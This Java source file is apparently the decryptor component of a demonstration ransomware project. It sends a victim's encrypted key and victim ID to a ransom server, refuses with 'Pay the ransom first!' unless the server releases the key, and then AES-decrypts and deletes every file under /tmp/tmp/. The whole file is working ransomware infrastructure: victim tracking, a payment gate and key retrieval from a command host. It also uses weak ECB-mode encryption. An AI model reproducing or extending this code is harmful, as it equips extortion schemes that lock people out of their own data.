import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.io.FileOutputStream;
import java.util.Base64;
import java.util.List;
import java.util.stream.Stream;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.util.Arrays;
import java.security.MessageDigest;
import java.io.UnsupportedEncodingException;

class secret {
	private static byte[] key;
	private static SecretKeySpec secretKey;
	void setKey(String myKey){
		MessageDigest sha = null;
		try{
			key = myKey.getBytes("UTF-8");
			sha = MessageDigest.getInstance("SHA-1");
			key = sha.digest(key);
			key = Arrays.copyOf(key, 16);
			secretKey = new SecretKeySpec(key, "AES");
		}
		catch (NoSuchAlgorithmException e){
			e.printStackTrace();
		}
		catch (UnsupportedEncodingException e){
			e.printStackTrace();
		}
	}
	void decryptFiles(int cipherMode,String key,String inputFile,String outputFile) throws Exception{
		setKey(key);
		Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
		cipher.init(Cipher.DECRYPT_MODE, secretKey);
		byte[] textString ;
		textString = Files.readAllBytes(Paths.get(inputFile));
		byte[] rawData = textString;
		byte[] plainText = cipher.doFinal(rawData);
		FileOutputStream fileOutputStream = null;
		try{
			fileOutputStream = new FileOutputStream(outputFile);
			fileOutputStream.write(plainText);
		}catch (IOException e){
			throw new IOException(e);
		}
	}
}

class RansomwareDeactivate{
	void decryptAllFiles(String key) throws IOException{
		secret sec = new secret();
		List<Path> fileNames = new ArrayList<Path>();
		try{
			Stream<Path> paths = Files.walk(Paths.get("/tmp/tmp/"));
			paths.filter(Files::isRegularFile).forEach(fileNames::add);
		}
		catch (Exception e){
			System.out.println(e);
		}
		for(Path file:fileNames){
			try{
				System.out.println("Decrypting file: "+file.toString());
				String inputFile = file.toString();
				String outputFile = inputFile.substring(0, inputFile.lastIndexOf('.'));
				sec.decryptFiles(Cipher.DECRYPT_MODE, key, inputFile,outputFile);
				File f = new File(inputFile);
				f.delete();
			}
			catch (Exception e){
				System.out.println(e);
			}
		}
	}		
}

class decrypt {
	static void activate(String ans) throws IOException{
			RansomwareDeactivate ransomware = new RansomwareDeactivate();
			ransomware.decryptAllFiles(ans);
	}

	static void validatePayment() throws IOException{
		//ID is the victim's ID
		int id = 1;
		File file = new File("/tmp/tmp/key.enc");
		String encoded_key = "";
		String modifiedKey = "";
		try{
			byte[] encKey = Files.readAllBytes(file.toPath());
			encoded_key = Base64.getEncoder().encodeToString(encKey).toString();
			//System.out.println(encoded_key);
			modifiedKey = encoded_key.replace('+', '-');
		}
		catch (FileNotFoundException e){
			e.printStackTrace();
		}
		catch (IOException e){
			e.printStackTrace();
		}
		URL obj = new URL("http://127.0.0.1/recv.php?decrypt="+modifiedKey+"&id="+id);
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
		con.setRequestMethod("GET");
		con.addRequestProperty("Victim", "Yes");
		BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
		String inputLine;
		StringBuffer response = new StringBuffer();
		while((inputLine = in.readLine()) != null){
			response.append(inputLine);
		}
		in.close();
		String ans  =response.toString();
		System.out.println(ans);
		if(ans.equals("Pay the ransom")){
			System.out.println("Pay the ransom first!");
			System.exit(0);
		}
		else
		{
			activate(ans);
		}
	}
	public static void main(String[] args) throws IOException{
		validatePayment();
		File f = new File("/tmp/tmp/key.enc");
		f.delete();
	}
}